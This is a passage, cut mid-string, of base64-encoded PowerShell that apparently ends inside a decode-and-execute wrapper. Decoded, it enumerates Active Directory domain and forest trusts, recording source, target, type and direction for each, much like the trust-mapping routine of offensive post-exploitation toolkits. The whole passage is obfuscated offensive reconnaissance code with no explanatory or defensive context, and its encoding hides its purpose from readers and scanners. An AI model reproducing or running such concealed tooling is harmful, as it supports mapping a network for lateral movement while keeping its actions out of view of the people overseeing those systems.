J5IHsKICAgICAgICAgICAgICAgIGlmKCRMREFQIC1vciAkRG9tYWluQ29udHJvbGxlcikgewogICAgICAgICAgICAgICAgICAgICRUcnVzdHMgPSBHZXQtTmV0RG9tYWluVHJ1c3QgLURvbWFpbiAkRG9tYWluIC1MREFQIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRUcnVzdHMgPSBHZXQtTmV0RG9tYWluVHJ1c3QgLURvbWFpbiAkRG9tYWluIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKCRUcnVzdHMgLWlzbm90IFtzeXN0ZW0uYXJyYXldKSB7CiAgICAgICAgICAgICAgICAgICAgJFRydXN0cyA9IEAoJFRydXN0cykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRUcnVzdHMgKz0gR2V0LU5ldEZvcmVzdFRydXN0IC1Gb3Jlc3QgJERvbWFpbgogICAgICAgICAgICAgICAgaWYgKCRUcnVzdHMpIHsKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkVHJ1c3QgaW4gJFRydXN0cykgewogICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlRG9tYWluID0gJFRydXN0LlNvdXJjZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICRUcnVzdC5UYXJnZXROYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRUcnVzdFR5cGUgPSAkVHJ1c3QuVHJ1c3RUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgICRUcnVzdERpcmVjdGlvbiA9ICRUcnVzdC5UcnVzdERpcmVjdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICREb21haW5zLnB1c2goJFRhcmdldERvbWFpbikKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU291cmNlRG9tYWluJyAiJFNvdXJjZURvbWFpbiIKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldERvbWFpbicgIiRUYXJnZXREb21haW4iCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUcnVzdFR5cGUnICIkVHJ1c3RUeXBlIgogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVHJ1c3REaXJlY3Rpb24nICIkVHJ1c3REaXJlY3Rpb24iCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbIV0gRXJyb3I6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))
